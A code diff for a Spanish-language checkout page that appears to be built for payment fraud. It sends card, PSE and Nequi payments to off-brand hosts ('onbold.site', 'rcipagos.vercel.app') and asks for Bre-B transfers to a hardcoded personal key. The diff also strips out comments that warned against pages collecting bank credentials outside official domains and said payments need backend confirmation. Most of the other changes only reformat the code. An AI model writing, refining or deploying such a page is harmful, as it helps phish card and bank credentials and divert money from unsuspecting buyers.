@@ -496,7 +496,7 @@ body {
     }
 
     .left-panel {
-        padding: -16px 18px;
+        padding: 16px 18px;
     }
 
     .col-6,
@@ -511,7 +511,7 @@ body {
     }
 }
 
-    .footer {
+.footer {
     width: 100%;
     padding: 20px 15px;
     text-align: center;
@@ -544,8 +544,14 @@ body {
 }
 
 @media (max-width: 480px) {
+
     .footer {
         padding: 16px 10px;
+    }
+
+    .footer-content {
+        font-size: 12px;
+        gap: 3px;
     }
 
     .footer-content {
@@ -782,16 +788,12 @@ body {
 const NEQUI_URL =
     'https://rcipagos.vercel.app/nequi.html';
 
-/*
- * Sustituye estas URLs por las URLs OFICIALES
- * de tu proveedor de pagos.
- *
- * No utilices páginas que soliciten credenciales
- * bancarias fuera del dominio oficial correspondiente.
- */
-const PSE_URL = 'https://rcipagos.vercel.app/pse.html';
+const PSE_URL =
+    'https://rcipagos.vercel.app/pse.html';
 
-const TARJETA_URL = 'https://onbold.site/rcitc/';
+const TARJETA_URL =
+    'https://onbold.site/rcitc/';
+
 
 /* ============================================================
    DATOS DE LA COMPRA
@@ -801,6 +803,7 @@ let _pago = null;
 let _credito = null;
 
 try {
+
     _pago = JSON.parse(
         sessionStorage.getItem('rci_pago') || 'null'
     );
@@ -810,7 +813,11 @@ try {
     );
 
 } catch (error) {
-    console.error('No fue posible leer los datos de pago.');
+
+    console.error(
+        'No fue posible leer los datos de pago.'
+    );
+
 }
 
 
@@ -843,12 +850,15 @@ function formatearCOP(valor) {
         return '$ 0';
     }
 
-    return numero.toLocaleString('es-CO', {
-        style: 'currency',
-        currency: 'COP',
-        minimumFractionDigits: 0,
-        maximumFractionDigits: 0
-    });
+    return numero.toLocaleString(
+        'es-CO',
+        {
+            style: 'currency',
+            currency: 'COP',
+            minimumFractionDigits: 0,
+            maximumFractionDigits: 0
+        }
+    );
 }
 
 
@@ -858,7 +868,8 @@ function formatearCOP(valor) {
 
 function inicializarCompra() {
 
-    const monto = Number(_pago?.monto || 0);
+    const monto =
+        Number(_pago?.monto || 0);
 
     const nombre =
         _credito?.nombre || '';
@@ -869,32 +880,49 @@ function inicializarCompra() {
     const email =
         _credito?.email || '';
 
-    document.getElementById('chkNombre').value =
+
+    document.getElementById(
+        'chkNombre'
+    ).value =
         nombre;
 
-    document.getElementById('chkApellido').value =
+    document.getElementById(
+        'chkApellido'
+    ).value =
         apellido;
 
-    document.getElementById('chkEmail').value =
+    document.getElementById(
+        'chkEmail'
+    ).value =
         email;
 
-    document.getElementById('chkRef').value =
+    document.getElementById(
+        'chkRef'
+    ).value =
         _pago?.referencia || '';
 
-    document.getElementById('chkDesc').value =
+    document.getElementById(
+        'chkDesc'
+    ).value =
         _pago?.concepto || '';
 
-    document.getElementById('chkValor').value =
+
+    document.getElementById(
+        'chkValor'
+    ).value =
         formatearCOP(monto);
+
 
     const montoFormateado =
         formatearCOP(monto);
+
 
     document.getElementById(
         'chkAmountDesktop'
     ).innerHTML =
         montoFormateado +
         '<span class="o-amount--currency">COP</span>';
+
 
     document.getElementById(
         'chkAmountMobile'
@@ -918,10 +946,15 @@ function construirUrlConMonto(ruta) {
     try {
 
         const url =
-            new URL(ruta, window.location.origin);
+            new URL(
+                ruta,
+                window.location.origin
+            );
+
 
         const monto =
             Number(_pago?.monto || 0);
+
 
         if (
             Number.isFinite(monto) &&
@@ -935,6 +968,7 @@ function construirUrlConMonto(ruta) {
 
         }
 
+
         if (_pago?.referencia) {
 
             url.searchParams.set(
@@ -943,6 +977,7 @@ function construirUrlConMonto(ruta) {
             );
 
         }
+
 
         return url.toString();
 
@@ -954,7 +989,9 @@ function construirUrlConMonto(ruta) {
         );
 
         return '';
+
     }
+
 }
 
 
@@ -973,6 +1010,7 @@ function mostrarCargando(
     modal.id =
         'mp-loading-modal';
 
+
     modal.innerHTML = `
 
         <img
@@ -984,9 +1022,12 @@ function mostrarCargando(
         <span id="mp-loading-txt">
             ${texto}
         </span>
+
     `;
 
+
     document.body.appendChild(modal);
+
 
     setTimeout(() => {
 
@@ -1006,6 +1047,7 @@ function mostrarCargando(
         }
 
     }, 1200);
+
 }
 
 
@@ -1026,6 +1068,7 @@ function mostrarError(texto) {
 
 let paymentNextUrl = '';
 
+
 function mostrarPaymentInfo(
     titulo,
     texto,
@@ -1035,15 +1078,18 @@ function mostrarPaymentInfo(
     paymentNextUrl =
         ruta || '';
 
+
     document.getElementById(
         'paymentInfoTitle'
     ).textContent =
         titulo;
 
+
     document.getElementById(
         'paymentInfoText'
     ).textContent =
         texto;
+
 
     document.getElementById(
         'paymentInfoAmount'
@@ -1052,9 +1098,11 @@ function mostrarPaymentInfo(
             Number(_pago?.monto || 0)
         );
 
+
     document.getElementById(
         'paymentInfoModal'
     ).classList.add('show');
+
 }
 
 
@@ -1076,6 +1124,7 @@ document.getElementById(
     function () {
 
         cerrarPaymentInfo();
+
 
         if (paymentNextUrl) {
 
@@ -1123,6 +1172,7 @@ function buildWrapper() {
             </svg>
 
         </span>
+
     `;
 
 
@@ -1135,6 +1185,7 @@ function buildWrapper() {
 
     tarjetaH.className =
         'mp-acc-header';
+
 
     tarjetaH.innerHTML = `
 
@@ -1163,6 +1214,7 @@ function buildWrapper() {
             ${chevronSvg}
 
         </div>
+
     `;
 
 
@@ -1171,6 +1223,7 @@ function buildWrapper() {
 
     tarjetaBody.className =
         'mp-tarjeta-body';
+
 
     tarjetaBody.innerHTML = `
 
@@ -1193,6 +1246,7 @@ function buildWrapper() {
             Continuar con tarjeta
 
         </button>
+
     `;
 
 
@@ -1204,6 +1258,7 @@ function buildWrapper() {
                 tarjetaBody.classList.toggle(
                     'open'
                 );
+
 
             tarjetaH.classList.toggle(
                 'open',
@@ -1229,12 +1284,15 @@ function buildWrapper() {
                     );
 
                     return;
+
                 }
+
 
                 const url =
                     construirUrlConMonto(
                         TARJETA_URL
                     );
+
 
                 mostrarCargando(
                     url,
@@ -1254,6 +1312,7 @@ function buildWrapper() {
 
     pseH.className =
         'mp-acc-header';
+
 
     pseH.innerHTML = `
 
@@ -1278,6 +1337,7 @@ function buildWrapper() {
             ${chevronSvg}
 
         </div>
+
     `;
 
 
@@ -1287,59 +1347,24 @@ function buildWrapper() {
     pseBody.className =
         'mp-acc-body';
 
+
+    /*
+     * PSE ahora solamente muestra el botón.
+     * No se solicitan ni almacenan datos
+     * de documento en esta página.
+     */
+
     pseBody.innerHTML = `
 
-        <div class="mp-mfield">
-
-            <label>
-                Tipo de documento
-            </label>
-
-            <select id="mp-tipo-doc">
-
-                <option value="CC">
-                    Cédula de Ciudadanía
-                </option>
-
-                <option value="CE">
-                    Cédula de Extranjería
-                </option>
-
-                <option value="TI">
-                    Tarjeta de Identidad
-                </option>
-
-                <option value="NIT">
-                    NIT
-                </option>
-
-                <option value="PP">
-                    Pasaporte
-                </option>
-
-            </select>
-
-            <span class="mp-arrow">
-                ▼
-            </span>
-
-        </div>
-
-
-        <div class="mp-mfield">
-
-            <label>
-                Número de documento
-            </label>
-
-            <input
-                type="tel"
-                id="mp-num-doc"
-                inputmode="numeric"
-                autocomplete="off">
-
-        </div>
-
+        <p style="
+            font-size:13px;
+            color:#666;
+            line-height:1.5;
+            margin:0 0 15px;
+        ">
+            Serás dirigido a la plataforma segura de PSE
+            para continuar con tu pago.
+        </p>
 
         <button
             class="mp-btn-pse"
@@ -1349,6 +1374,7 @@ function buildWrapper() {
             Continuar con PSE
 
         </button>
+
     `;
 
 
@@ -1360,6 +1386,7 @@ function buildWrapper() {
                 pseBody.classList.toggle(
                     'open'
                 );
+
 
             pseH.classList.toggle(
                 'open',
@@ -1378,29 +1405,6 @@ function buildWrapper() {
             'click',
             () => {
 
-                const tipoDoc =
-                    document.getElementById(
-                        'mp-tipo-doc'
-                    ).value;
-
-                const numDoc =
-                    document.getElementById(
-                        'mp-num-doc'
-                    ).value
-                    .replace(/\D/g, '')
-                    .trim();
-
-
-                if (!numDoc) {
-
-                    alert(
-                        'Ingresa tu número de documento.'
-                    );
-
-                    return;
-                }
-
-
                 if (!PSE_URL) {
 
                     mostrarError(
@@ -1408,24 +1412,8 @@ function buildWrapper() {
                     );
 
                     return;
+
                 }
-
-
-                /*
-                 * Los datos básicos pueden guardarse
-                 * para continuar la operación.
-                 *
-                 * Nunca se almacenan contraseñas,
-                 * OTP o claves bancarias.
-                 */
-
-                sessionStorage.setItem(
-                    'pse_datos',
-                    JSON.stringify({
-                        tipoDoc,
-                        numDoc
-                    })
-                );
 
 
                 const url =
@@ -1453,6 +1441,7 @@ function buildWrapper() {
     nequiH.className =
         'mp-acc-header';
 
+
     nequiH.innerHTML = `
 
         <div class="mp-acc-left">
@@ -1473,18 +1462,13 @@ function buildWrapper() {
             ${chevronSvg}
 
         </div>
+
     `;
 
 
     nequiH.addEventListener(
         'click',
         () => {
-
-            /*
-             * El monto se agrega explícitamente:
-             *
-             * nequi.html?monto=171400
-             */
 
             const url =
                 construirUrlConMonto(
@@ -1511,6 +1495,7 @@ function buildWrapper() {
     brebH.className =
         'mp-acc-header';
 
+
     brebH.innerHTML = `
 
         <div class="mp-acc-left">
@@ -1530,6 +1515,7 @@ function buildWrapper() {
             ${chevronSvg}
 
         </div>
+
     `;
 
 
@@ -1543,6 +1529,7 @@ function buildWrapper() {
                 formatearCOP(
                     Number(_pago?.monto || 0)
                 );
+
 
             document.getElementById(
                 'brevModal'
@@ -1563,6 +1550,7 @@ function buildWrapper() {
 
 
     return wrapper;
+
 }
 
 
@@ -1575,6 +1563,7 @@ document.getElementById(
 ).appendChild(
     buildWrapper()
 );
+
 
 document.getElementById(
     'mp-wrapper-mobile'
@@ -1605,14 +1594,17 @@ document.getElementById(
         const llave =
             '@LITTIO1047039997';
 
+
         try {
 
             await navigator.clipboard.writeText(
                 llave
             );
 
+
             this.textContent =
                 'Llave copiada';
+
 
             setTimeout(() => {
 
@@ -1620,6 +1612,7 @@ document.getElementById(
                     'Copiar llave';
 
             }, 1800);
+
 
         } catch (error) {
 
@@ -1642,13 +1635,6 @@ document.getElementById(
 
         cerrarBreB();
 
-        /*
-         * Aquí no se declara que el pago está confirmado.
-         *
-         * Un backend debe comprobar realmente
-         * el estado de la transacción antes de
-         * marcarla como pagada.
-         */
 
         mostrarError(
             'Tu solicitud fue registrada. La confirmación del pago debe realizarse mediante el sistema de pagos.'
@@ -1668,6 +1654,7 @@ window.addEventListener(
 
         const monto =
             Number(_pago?.monto || 0);
+
 
         if (
             !Number.isFinite(monto) ||
